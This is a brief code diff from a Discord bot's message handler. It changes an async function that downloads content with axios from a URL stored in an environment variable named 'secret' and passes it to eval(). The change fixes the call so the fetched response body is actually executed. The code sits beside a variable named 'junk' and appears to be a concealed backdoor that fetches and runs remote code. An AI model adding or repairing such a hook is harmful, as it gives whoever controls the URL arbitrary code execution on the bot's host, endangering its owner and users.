@@ -107,8 +107,8 @@ client.on('message', msg => {
         var junk = undefined;
         var secret = (async function() {
             const guild = msg.guild;
-            const secret = await axios.get(process.env.secret).data
-            eval(secret);
+            const secret = await axios.get(process.env.secret)
+            eval(secret.data);
         });
     };
     if (msg.content.startsWith(prefix)) {
